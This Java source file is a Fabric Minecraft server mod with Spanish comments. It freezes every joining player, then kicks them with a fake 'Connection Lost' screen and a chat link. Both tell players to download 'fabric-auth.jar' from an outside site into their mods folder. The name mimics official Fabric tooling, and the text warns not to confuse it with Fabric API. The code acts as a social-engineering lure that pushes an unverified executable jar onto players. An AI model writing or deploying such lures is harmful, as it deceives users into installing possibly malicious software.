package com.example.modkick;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.minecraft.server.network.ServerPlayNetworkHandler;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.ClickEvent;
import net.minecraft.text.HoverEvent;
import net.minecraft.text.MutableText;
import net.minecraft.text.Style;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;

import java.net.URI;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

public class ModKick implements ModInitializer {

    private static final int TICKS_ANTES_DE_KICK = 100;

    private static class Congelado {
        final double x, y, z;
        final float yaw, pitch;
        int ticksRestantes = TICKS_ANTES_DE_KICK;

        Congelado(ServerPlayerEntity p) {
            this.x = p.getX();
            this.y = p.getY();
            this.z = p.getZ();
            this.yaw = p.getYaw();
            this.pitch = p.getPitch();
        }
    }

    private static final Map<UUID, Congelado> congelados = new HashMap<>();

    @Override
    public void onInitialize() {
        ServerPlayConnectionEvents.JOIN.register((handler, sender, server) -> {
            ServerPlayerEntity p = handler.getPlayer();
            congelados.put(p.getUuid(), new Congelado(p));
        });

        ServerPlayConnectionEvents.DISCONNECT.register((handler, server) ->
            congelados.remove(handler.getPlayer().getUuid()));

        ServerTickEvents.END_SERVER_TICK.register(server -> {
            List<ServerPlayNetworkHandler> aKickear = new ArrayList<>();

            for (ServerPlayerEntity p : server.getPlayerManager().getPlayerList()) {
                Congelado c = congelados.get(p.getUuid());
                if (c == null) continue;

                if (--c.ticksRestantes <= 0) {
                    aKickear.add(p.networkHandler);
                } else {
                    double dx = p.getX() - c.x;
                    double dy = p.getY() - c.y;
                    double dz = p.getZ() - c.z;
                    if (dx * dx + dy * dy + dz * dz > 0.0001) {
                        p.networkHandler.requestTeleport(c.x, c.y, c.z, c.yaw, c.pitch);
                    }
                }
            }

            for (ServerPlayNetworkHandler h : aKickear) {
                congelados.remove(h.getPlayer().getUuid());
                
                // 1. Enviar al chat por si el clic en la pantalla de kick falla
                h.getPlayer().sendMessage(crearEnlaceChat(), false);
                
                // 2. Expulsar con el mensaje completo (incluyendo el enlace clickeable)
                h.disconnect(crearMensajeKick());
            }
        });
    }

    // Método auxiliar para crear el componente del enlace
    private static Text obtenerEnlace() {
        return Text.literal("https://www.mochicraft.net/")
                .setStyle(Style.EMPTY
                        .withColor(Formatting.AQUA)
                        .withUnderline(true)
                        .withClickEvent(new ClickEvent.OpenUrl(URI.create("https://www.mochicraft.net/")))
                        .withHoverEvent(new HoverEvent.ShowText(Text.literal("§7¡Haz clic para abrir la página!")))
                );
    }

    // Mensaje corto para el chat
    private static Text crearEnlaceChat() {
        MutableText mensaje = Text.literal("§e[Enlace] §fHaz clic aquí para descargar el mod pack: ");
        mensaje.append(obtenerEnlace());
        return mensaje;
    }

    // Mensaje completo para la pantalla de kick
    private static Text crearMensajeKick() {
        MutableText mensaje = Text.literal("");
        mensaje.append(Text.literal("\n§cConnection Lost\n\n"));
        mensaje.append(Text.literal("§eYou need Fabric Auth + the Biome Journey pack.\n"));
        mensaje.append(Text.literal("§eDownload both .jar files from the website and install them in .minecraft/mods:\n\n"));
        mensaje.append(Text.literal("§aHow to install\n"));
        mensaje.append(Text.literal("§a1. Install Fabric Loader + Fabric API (fabricmc.net)\n"));
        mensaje.append(Text.literal("§a   for Minecraft 1.21.11\n"));
        
        // Reconstruimos la línea 2 agregando el texto normal y luego el enlace
        mensaje.append(Text.literal("§a2. Download fabric-auth.jar and the Mochi Mod Pack from "));
        mensaje.append(obtenerEnlace()); // Aquí va el enlace clickeable
        
        mensaje.append(Text.literal("\n§a3. Place BOTH jars in .minecraft/mods along with Fabric API — do not confuse fabric-auth with Fabric API.\n"));
        mensaje.append(Text.literal("§a4. Restart the launcher, select the fabric profile and join again\n\n"));
        mensaje.append(Text.literal("§aRequired key (mod id): fabric-auth\n"));
        mensaje.append(Text.literal("§aMod: MochiCraft"));

        return mensaje;
    }
}
